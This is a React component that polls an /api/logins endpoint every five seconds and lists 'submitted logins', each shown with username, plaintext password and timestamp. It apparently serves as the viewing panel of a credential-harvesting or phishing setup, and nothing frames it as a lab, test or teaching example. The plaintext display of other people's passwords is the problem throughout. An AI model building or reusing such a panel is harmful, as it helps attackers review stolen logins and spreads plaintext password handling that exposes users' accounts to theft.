import { useEffect, useState } from "react";

export default function Viewer() {
  const [logins, setLogins] = useState([]);
  const [error, setError] = useState("");

  useEffect(() => {
    async function fetchLogins() {
      try {
        const res = await fetch("/api/logins");
        if (!res.ok) throw new Error("Failed to fetch");
        const data = await res.json();
        setLogins(data.logins || []);
      } catch {
        setError("Error fetching logins");
      }
    }
    fetchLogins();

    // Optional: refresh every 5 seconds
    const interval = setInterval(fetchLogins, 5000);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="container">
      <h1>Submitted Logins</h1>
      {error && <div className="message">{error}</div>}
      {logins.length === 0 ? (
        <p>No logins submitted yet.</p>
      ) : (
        logins.map((item, idx) => (
          <div key={idx} className="login-item">
            <strong>Username:</strong> {item.username} <br />
            <strong>Password:</strong> {item.password} <br />
            <small>At: {new Date(item.timestamp).toLocaleString()}</small>
          </div>
        ))
      )}
    </div>
  );
}